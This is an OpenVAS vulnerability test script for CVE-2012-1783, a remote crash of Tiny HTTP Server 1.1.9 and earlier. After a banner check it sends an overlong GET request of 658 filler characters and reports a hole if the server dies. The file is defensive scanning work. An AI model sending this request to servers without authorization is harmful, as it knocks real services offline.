###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tiny_http_server_remote_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Tiny HTTP Server Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Tiny HTTP Server versions 1.1.9 and prior";
tag_insight = "The flaw is due to an error when processing certain requests and can
  be exploited to cause a denial of service via a specially crafted packet.";
tag_solution = "No solution or patch is available as of 28th February, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://tinyserver.sourceforge.net";
tag_summary = "The host is running Tiny HTTP Server and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(802614);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1783");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-05 11:01:07 +0530 (Mon, 05 Mar 2012)");
  script_name("Tiny HTTP Server Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73482");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18524");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110220/Tiny-HTTP-Server-1.1.9-Crash.html");

  script_description(desc);
  script_summary("Check if Tiny HTTP Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
banner = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: TinyServer" >!< banner){
  exit(0);
}

## Construct attack request
req = http_get(item:string("/",crap(658)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);

## Confirm Tiny HTTP Server is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
